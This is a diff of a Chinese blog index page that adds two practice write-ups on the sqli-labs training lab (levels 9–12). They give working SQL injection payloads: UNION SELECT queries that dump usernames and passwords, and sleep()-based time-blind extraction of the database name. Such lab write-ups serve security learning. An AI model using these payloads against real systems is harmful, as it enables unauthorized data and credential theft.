@@ -145,6 +145,151 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/13/article-title-7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yanghaoxuan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yanghaoxuan'sBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/13/article-title-7/" class="post-title-link" itemprop="url">sqli-labs练习(第十一、十二关)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-13 19:59:08 / 修改时间：20:53:54" itemprop="dateCreated datePublished" datetime="2020-12-13T19:59:08+08:00">2020-12-13</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>在之前的十关是get型，接下来是post型</p>
+<p>我个人用的是火狐浏览器，提前下载好了hackbar，http header live等插件，方便操作。</p>
+<h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h3><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><p>先打开http header libve,接着输入用户名与密码（都为admin）就行抓包得到：<code>uname=admin&amp;passwd=admin&amp;submit=Submit</code>将其添加到hackbar的post data中。</p>
+<h4 id="验证注入漏洞"><a href="#验证注入漏洞" class="headerlink" title="验证注入漏洞"></a>验证注入漏洞</h4><p><code>uname=admin&#39;&amp;passwd=admin&amp;submit=Submit</code>在用户名后面加上单引号，发现报错，说明有注入漏洞。</p>
+<p><code>uname=admin&#39; or 1=1 #&amp;passwd=admin&amp;submit=Submit</code>接下来加上<code>or</code>语句与注释符<code>#</code>（注意不能是–+，– ），发现并未报错。</p>
+<p>接着就是最基础的步骤，如同第一关</p>
+<p>确定字段数量，确认占位信息，查库、表、字段</p>
+<p><code>uname=adm&#39; order by 3 #&amp;passwd=admin&amp;submit=Submit</code>报错</p>
+<p><code>uname=adm&#39; order by 2 #&amp;passwd=admin&amp;submit=Submit</code>正常，说明字段数为2</p>
+<p><code>uname=adm&#39; union select 1,database() #&amp;passwd=admin&amp;submit=Submit</code>得出库名<code>security</code></p>
+<p><code>uname=adm&#39; union select 1, table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1#&amp;passwd=admin&amp;submit=Submit</code>用limit将表名一个一个输出</p>
+<p>字段可以用limit单个输出，也可以一次性输出，如：<code>uname=adm&#39; union select 1, group_concat(concat_ws(0x7e,username,password)) from users #&amp;passwd=admin&amp;submit=Submit</code></p>
+<h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h3><p>与第十一关相同，只不过把<code>‘</code>改成<code>“）</code></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/13/article-title-6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yanghaoxuan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yanghaoxuan'sBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/13/article-title-6/" class="post-title-link" itemprop="url">sqli-labs练习(第九、十关):延时盲注</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-13 19:59:01 / 修改时间：21:35:37" itemprop="dateCreated datePublished" datetime="2020-12-13T19:59:01+08:00">2020-12-13</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>课前复习：</p>
+<ol>
+<li>if(var1,var2,var3)<br><code>var1：条件</code><br><code>var2：条件为真时返回的值</code><br><code>var3：条件为假时返回的值</code></li>
+<li>sleep(var)<br><code>暂停执行var秒,可以为小数</code></li>
+</ol>
+<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><h4 id="判断闭合符，构建if语句"><a href="#判断闭合符，构建if语句" class="headerlink" title="判断闭合符，构建if语句"></a>判断闭合符，构建if语句</h4><p>构建一个能延时的if语句，例如<code>?id=2&#39; and if(3&gt;2,sleep(3),1)--+</code>接着便判断闭合符。</p>
+<p>不加引号、加上双引号。都立马刷新，加上单引号后，延迟了3秒才刷新出来。说明闭合符是<code>&#39;</code>单引号。</p>
+<p>将3&gt;2换成查找语句，就与之前的布尔盲注相似了。</p>
+<h4 id="找到数据库名的长度"><a href="#找到数据库名的长度" class="headerlink" title="找到数据库名的长度"></a>找到数据库名的长度</h4><p>因为根据之前的练习以及知道数据库的字符长度为8位，</p>
+<p>所以直接判断长度是否为8<code>?id=2&#39; and if(length(database())&gt;7,sleep(3),1)--+</code></p>
+<h4 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h4><p><code>*?id=2&#39; and if(ascii(substr(database(),1,1))&gt;114,sleep(3),1)--+*</code>延时</p>
+<p><code>*?id=2&#39; and if(ascii(substr(database(),1,1))&gt;115,sleep(3),1)--+*</code>不延时</p>
+<p>说明第一个字符是s。</p>
+<p>……..</p>
+<p>接下来就是表名，列名等等，与之前的布尔盲注一样。</p>
+<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p>与第九关一样，不再描述。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/13/article-title-5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -709,7 +854,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
